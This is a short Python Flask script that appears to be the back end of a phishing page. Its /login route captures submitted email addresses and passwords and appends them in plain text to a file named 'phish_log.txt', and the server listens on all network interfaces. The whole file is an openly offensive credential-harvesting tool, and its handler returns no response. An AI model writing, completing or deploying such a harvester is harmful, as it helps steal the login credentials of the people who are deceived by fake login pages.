from flask import Flask, request

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def handle_login():
    email = request.form.get('email')
    password = request.form.get('password')

    with open("phish_log.txt", "a") as f:
        f.write(f"Email: {email} | Password: {password}\n")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
